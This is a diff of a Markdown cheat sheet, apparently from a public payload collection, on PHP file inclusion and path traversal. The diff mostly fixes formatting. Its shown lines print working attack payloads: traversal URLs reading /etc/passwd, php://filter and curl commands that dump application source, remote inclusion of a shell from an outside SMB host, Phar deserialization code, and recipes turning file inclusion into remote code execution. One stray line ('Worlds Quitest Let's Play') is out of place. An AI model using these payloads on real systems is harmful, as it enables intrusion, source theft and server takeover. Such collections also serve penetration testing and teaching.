@@ -1,18 +1,17 @@
 # File Inclusion
 
 > The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
-
 > The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
 
 ## Summary
 
 * [Tools](#tools)
 * [Basic LFI](#basic-lfi)
-    * [Null byte](#null-byte)
-    * [Double encoding](#double-encoding)
-    * [UTF-8 encoding](#utf-8-encoding)
-    * [Path and dot truncation](#path-and-dot-truncation)
-    * [Filter bypass tricks](#filter-bypass-tricks)
+  * [Null byte](#null-byte)
+  * [Double encoding](#double-encoding)
+  * [UTF-8 encoding](#utf-8-encoding)
+  * [Path and dot truncation](#path-and-dot-truncation)
+  * [Filter bypass tricks](#filter-bypass-tricks)
 * [Basic RFI](#basic-rfi)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
   * [Wrapper php://filter](#wrapper-phpfilter)
@@ -73,7 +72,7 @@ On most PHP installations a filename longer than 4096 bytes will be cut off so a
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
-http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
+http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 
@@ -113,7 +112,6 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 2. Write a PHP code inside a file : `shell.php`
 3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
-
 ## LFI / RFI using wrappers
 
 ### Wrapper php://filter
@@ -133,12 +131,13 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained multiple times using `|` or `/`: 
+NOTE: Wrappers can be chained multiple times using `|` or `/`:
+
 - Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
 - deflate then base64encode (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
 
 ```powershell
-./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
+./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
 
@@ -202,7 +201,7 @@ $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
 
-If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
+If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or__wakeup() defined, then those methods are automatically invoked
 
 ```php
 class AnyClass {
@@ -219,7 +218,7 @@ NOTE: The unserialize is triggered for the phar:// wrapper in any file operation
 ## LFI to RCE via /proc/*/fd
 
 1. Upload a lot of shells (for example : 100)
-2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
+2. Include <http://example.com/index.php?page=/proc/>$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
 
 ## LFI to RCE via /proc/self/environ
 
@@ -241,7 +240,9 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
 
 ## LFI to RCE via upload (race)
+
 Worlds Quitest Let's Play"
+
 * Upload a file and trigger a self-inclusion.
 * Repeat 1 a shitload of time to:
 * increase our odds of winning the race
@@ -271,16 +272,15 @@ for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
 print('[x] Something went wrong, please try again')
 ```
 
-
 ## LFI to RCE via phpinfo()
 
 PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
 
 > By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
 
-Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+Use the script phpInfoLFI.py (also available at <https://www.insomniasec.com/downloads/publications/phpinfolfi.py>)
 
-Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+Research from <https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>
 
 ## LFI to RCE via controlled log file
 
